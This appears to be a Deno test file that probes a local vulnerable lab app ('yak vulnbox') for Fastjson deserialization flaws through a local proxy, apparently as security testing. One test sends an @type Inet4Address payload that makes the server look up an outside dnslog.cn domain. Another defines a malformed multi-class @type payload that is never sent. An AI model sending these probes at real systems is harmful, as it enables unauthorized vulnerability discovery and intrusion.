Deno.test('fast json yak vulnbox', async () => {
  let client = Deno.createHttpClient({ proxy: { url: 'http://localhost:8083' } });

  // let url = `http://localhost:8787/fastjson/json-in-query?auth=%7B%22user%22%3A%22admin%22%2C%22password%22%3A%22password%22%7D`;
  const res = await fetch('http://localhost:8787/fastjson/json-in-query?auth=%7B%22user%22%3A%22admin%22%2C%22password%22%3A%22dsa%22%7D&action=login', {
    'headers': {
      'accept': '*/*',
      'accept-language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
      'sec-ch-ua': '"Not(A:Brand";v="99", "Microsoft Edge";v="133", "Chromium";v="133"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-origin',
      'x-requested-with': 'XMLHttpRequest',
    },
    'referrer': 'http://localhost:8787/fastjson/json-in-query?auth=%7B%22user%22%3A%22admin%22%2C%22password%22%3A%22password%22%7D',
    'referrerPolicy': 'strict-origin-when-cross-origin',
    'body': null,
    'method': 'GET',
    'mode': 'cors',
    'credentials': 'omit',
    client,
  });
  const restext = await res.text();
  console.log(restext);
  client.close();
  // await fetch(url, { client })
});

Deno.test('fast json ', async () => {
  let client = Deno.createHttpClient({ proxy: { url: 'http://localhost:8083' } });
  await fetch(`http://127.0.0.1:8787/fastjson/json-in-query?auth=${encodeURIComponent('{"@type":"java.net.Inet4Address","val":"kpdpx1.dnslog.cn"}')}&action=login`, { client }).then((r) => r.text());
  await fetch(`http://localhost:8787/fastjson/json-in-query?auth=%7B%22user%22%3A%22admin%22%2C%22password%22%3A%22password%22%7D`,{client}).then(r=>r.text())
  client.close();
});

Deno.test('http', async () => {
    let payload = `[
  {
    "@type": "java.lang.Class",
    "val": "java.io.ByteArrayOutputStream"
  },
  {
    "@type": "java.io.ByteArrayOutputStream"
  },
  {
    "@type": "java.net.InetSocketAddress"
  {
    "address":,
    "val": "kpdpx1.dnslog.cn"
  }
}
]`;
    // payload= JSON.stringify({"@type":"java.net.Inet4Address","val":"kpdpx1.dnslog.cn"}),
        
  let client = Deno.createHttpClient({ proxy: { url: 'http://localhost:8083' } });
  let res = await fetch('http://localhost:8090/', {
    'method': 'POST',
    'headers': {
      'content-type': 'application/json',
    },
    'body':'{"age":1}',
    client,
  });

  console.log('res html:',await res.text());
  client.close();
});
